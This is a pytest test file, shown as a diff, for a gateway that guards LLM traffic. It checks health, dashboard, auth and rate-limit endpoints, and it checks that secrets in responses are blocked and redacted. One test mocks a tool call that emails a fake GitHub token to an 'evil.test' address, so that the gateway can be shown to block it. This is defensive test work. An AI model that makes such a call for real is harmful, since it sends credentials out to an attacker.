@@ -1,0 +1,159 @@
+"""FR-2 — gateway wraps the SDK: proxies, guards tool calls + responses, serves dashboard.
+
+Offline: a MockProvider is injected so no network/LLM is needed (runs on the gate).
+"""
+
+from __future__ import annotations
+
+import pytest
+from fastapi.testclient import TestClient
+
+from aegis import PolicyMode, Settings
+from aegis.gateway.app import create_app
+from aegis.providers.base import ProviderResponse, ToolCall
+from aegis.providers.mock import MockProvider
+from tests.conftest import FAKE_GITHUB_PAT
+
+
+def _client(tmp_path, provider) -> TestClient:
+    settings = Settings(policy_mode=PolicyMode.BALANCED, traces_dir=tmp_path / "traces")
+    return TestClient(create_app(settings=settings, provider=provider))
+
+
+def test_health(tmp_path) -> None:
+    c = _client(tmp_path, MockProvider(text="ok"))
+    r = c.get("/health")
+    assert r.status_code == 200
+    assert r.json()["status"] == "ok"
+    assert r.json()["provider"] == "mock"
+
+
+def test_benign_chat_allowed(tmp_path) -> None:
+    c = _client(tmp_path, MockProvider(text="The weather is sunny."))
+    r = c.post("/v1/chat/completions", json={
+        "session_id": "s1",
+        "messages": [{"role": "user", "content": "weather?"}],
+    })
+    body = r.json()
+    assert body["blocked"] is False
+    assert body["output"] == "The weather is sunny."
+    assert body["aegis"]["request"]["action"] == "ALLOW"
+
+
+def test_tool_call_exfiltration_blocked(tmp_path) -> None:
+    leaky = MockProvider(
+        responder=lambda _m: ProviderResponse(
+            text="done",
+            tool_calls=[ToolCall("send_email", {"to": "x@evil.test", "body": FAKE_GITHUB_PAT})],
+        )
+    )
+    c = _client(tmp_path, leaky)
+    r = c.post("/v1/chat/completions", json={
+        "session_id": "s1",
+        "messages": [{"role": "user", "content": "summarize"}],
+    })
+    body = r.json()
+    assert body["blocked"] is True
+    assert body["tool_calls"][0]["allowed"] is False
+    assert body["tool_calls"][0]["decision"]["action"] == "BLOCK"
+
+
+def test_response_with_secret_blocked(tmp_path) -> None:
+    leaky = MockProvider(text=f"the key is {FAKE_GITHUB_PAT}")
+    c = _client(tmp_path, leaky)
+    r = c.post("/v1/chat/completions", json={
+        "session_id": "s1",
+        "messages": [{"role": "user", "content": "give me the key"}],
+    })
+    body = r.json()
+    assert body["blocked"] is True
+    assert "blocked by Aegis" in body["output"]  # raw secret withheld
+    assert FAKE_GITHUB_PAT not in r.text
+
+
+def test_direct_guard_endpoint(tmp_path) -> None:
+    c = _client(tmp_path, MockProvider())
+    r = c.post("/guard/response", json={"session_id": "s1", "output": f"leak {FAKE_GITHUB_PAT}"})
+    assert r.json()["action"] == "BLOCK"
+
+
+def test_dashboard_served(tmp_path) -> None:
+    c = _client(tmp_path, MockProvider())
+    # Generate a decision so the feed isn't empty.
+    c.post("/guard/response", json={"session_id": "s1", "output": "hello"})
+    r = c.get("/")
+    assert r.status_code == 200
+    assert "text/html" in r.headers["content-type"]
+    assert "Aegis" in r.text
+
+
+def test_try_console_served(tmp_path) -> None:
+    c = _client(tmp_path, MockProvider())
+    r = c.get("/try")
+    assert r.status_code == 200
+    assert "text/html" in r.headers["content-type"]
+    assert "Test Console" in r.text
+    assert "/guard/response" in r.text  # the form posts to the real guard endpoint
+
+
+def test_favicon_no_content(tmp_path) -> None:
+    c = _client(tmp_path, MockProvider())
+    assert c.get("/favicon.ico").status_code == 204
+
+
+def test_dashboard_links_to_console(tmp_path) -> None:
+    c = _client(tmp_path, MockProvider())
+    assert '/try' in c.get("/").text
+
+
+def test_blocked_traffic_is_traced(tmp_path) -> None:
+    c = _client(tmp_path, MockProvider(text=f"leak {FAKE_GITHUB_PAT}"))
+    c.post("/v1/chat/completions", json={
+        "session_id": "trace-sess",
+        "messages": [{"role": "user", "content": "x"}],
+    })
+    trace = tmp_path / "traces" / "trace-sess.jsonl"
+    assert trace.exists()
+    assert FAKE_GITHUB_PAT not in trace.read_text(encoding="utf-8")  # redacted at rest
+
+
+def test_basic_auth_gates_when_configured(tmp_path) -> None:
+    settings = Settings(traces_dir=tmp_path / "traces")
+    app = create_app(settings=settings, provider=MockProvider(), auth=("admin", "s3cret"))
+    c = TestClient(app)
+    assert c.get("/").status_code == 401  # no credentials
+    assert c.get("/", auth=("admin", "wrong")).status_code == 401  # bad password
+    assert c.get("/", auth=("admin", "s3cret")).status_code == 200  # correct
+
+
+def test_health_stays_open_under_auth(tmp_path) -> None:
+    settings = Settings(traces_dir=tmp_path / "traces")
+    app = create_app(settings=settings, provider=MockProvider(), auth=("admin", "s3cret"))
+    # Platform health checks must pass without credentials.
+    assert TestClient(app).get("/health").status_code == 200
+
+
+def test_rate_limit_returns_429(tmp_path) -> None:
+    settings = Settings(traces_dir=tmp_path / "traces")
+    app = create_app(settings=settings, provider=MockProvider(), rate_limit_per_min=2)
+    c = TestClient(app)
+    body = {"session_id": "rl", "output": "hi"}
+    assert c.post("/guard/response", json=body).status_code == 200
+    assert c.post("/guard/response", json=body).status_code == 200
+    assert c.post("/guard/response", json=body).status_code == 429  # 3rd exceeds limit
+
+
+def test_open_by_default(tmp_path) -> None:
+    # No auth configured -> open (local dev stays frictionless).
+    c = _client(tmp_path, MockProvider())
+    assert c.get("/").status_code == 200
+
+
+@pytest.fixture(autouse=True)
+def _no_openai(monkeypatch) -> None:
+    # Ensure the default provider builder never tries the live path, and that ambient
+    # auth/rate env vars never leak into tests that don't set them explicitly.
+    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
+    monkeypatch.delenv("AEGIS_AUTH_USER", raising=False)
+    monkeypatch.delenv("AEGIS_AUTH_PASSWORD", raising=False)
+    monkeypatch.delenv("AEGIS_RATE_LIMIT_PER_MIN", raising=False)
